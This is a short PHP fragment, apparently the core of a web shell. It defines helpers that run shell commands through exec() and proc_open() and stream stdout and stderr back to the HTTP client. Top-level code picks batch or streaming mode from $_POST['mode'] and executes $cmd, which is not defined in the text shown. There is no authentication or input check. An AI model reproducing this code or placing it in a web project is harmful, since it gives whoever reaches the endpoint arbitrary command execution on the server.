// contract: exec_cmd(string $cmd): array{0:string,1:int}
function exec_cmd(string $cmd): array
{
    $out = [];
    $rc  = 0;
    exec($cmd . ' 2>&1', $out, $rc);
    return [implode("\n", $out), $rc];
}

// contract: run(string $cmd): void — 流式回显，适合长输出
function run(string $cmd): void
{
    $proc = proc_open($cmd, [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w'],
    ], $pipes);
    if (!is_resource($proc)) {
        http_response_code(500);
        echo "[spawn failed]\n";
        return;
    }
    fclose($pipes[0]);
    stream_set_blocking($pipes[1], false);
    stream_set_blocking($pipes[2], false);
    while (!feof($pipes[1]) || !feof($pipes[2])) {
        $read = [$pipes[1], $pipes[2]];
        $w = null; $e = null;
        if (stream_select($read, $w, $e, 1) === false) break;
        foreach ($read as $fp) {
            $chunk = fread($fp, 8192);
            if ($chunk !== false && $chunk !== '') echo $chunk;
        }
        flush();
    }
    fclose($pipes[1]);
    fclose($pipes[2]);
    $rc = proc_close($proc);
    echo "\n[exit {$rc}]";
}

$mode = $_POST['mode'] ?? 'batch';

if ($mode === 'stream') {
    run($cmd);
} else {
    [$out, $rc] = exec_cmd($cmd);
    echo $out, "\n[exit {$rc}]";
}
